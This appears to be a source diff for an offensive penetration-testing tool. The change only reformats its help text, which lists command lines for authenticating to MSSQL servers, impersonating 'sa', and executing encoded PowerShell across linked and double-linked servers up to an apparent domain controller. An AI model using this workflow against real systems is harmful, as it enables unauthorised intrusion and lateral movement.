@@ -41,31 +41,31 @@ Usage: Examples:"
 SQLinkedCodeExec.exe /?  - show's this help menu \n"
 
 //Authenticate to target MSSQL with username and password"
-SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password>\n"
+SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password"
 
 //Authenticate to target MSSQL with current system token"
-SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /syscreds true\n"
+SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /syscreds true"
 
 //Execute Code on target MSSQL server "
-SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /localexec true /codexec < Whatever - command - goes - here > \n"
+SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /localexec true /codexec < Whatever - command - goes - here > "
 
 //Check if target MSSQL server has any server links"
-SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true /lnk true\n"
+SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true /lnk true"
 
 //Execute Code on linked MSSQL server instance (appsrv01) - Link 1"
-SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec true /lnkedt appsrv01 /codexec <powershell - enc...>\n"
+SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec true /lnkedt appsrv01 /codexec <powershell - enc...>"
 
 //Impersonate sa account and execute Code on linked MSSQL server instance (appsrv01) - Link 1"
-SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnk true /impersonate true /imp_user sa /imp_db msdb /codexec <powershell - enc>\n"
+SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnk true /impersonate true /imp_user sa /imp_db msdb /codexec <powershell - enc>"
 
 //Enumerate linked MSSQL server (appsrv01) for additional links to other instances - Link 1"
-SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnkedt appsrv01 /lnkedtcheck1 true\n"
+SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnkedt appsrv01 /lnkedtcheck1 true"
 
 //Checked double linked server (dc01) for the user we are operating as - Link 1"
-SQLinkedCodeExec.exe /t <target name or IP> /syscreds true  /lnkedt appsrv01 /lnkedtt dc01 /lnkedtcheck2 true\n"
+SQLinkedCodeExec.exe /t <target name or IP> /syscreds true  /lnkedt appsrv01 /lnkedtt dc01 /lnkedtcheck2 true"
 
 //Execute code on double linked server (dc01)"
-SQLinkedCodeExec.exe /t dc01 /user someguy /pass somepass /syscreds true /lnk true  /link2exec true /lnkedt appsrv01 /lnkedtt dc01 /codexec <powershell - enc....>\n"
+SQLinkedCodeExec.exe /t dc01 /user someguy /pass somepass /syscreds true /lnk true  /link2exec true /lnkedt appsrv01 /lnkedtt dc01 /codexec <powershell - enc....>"
 ```
 
 
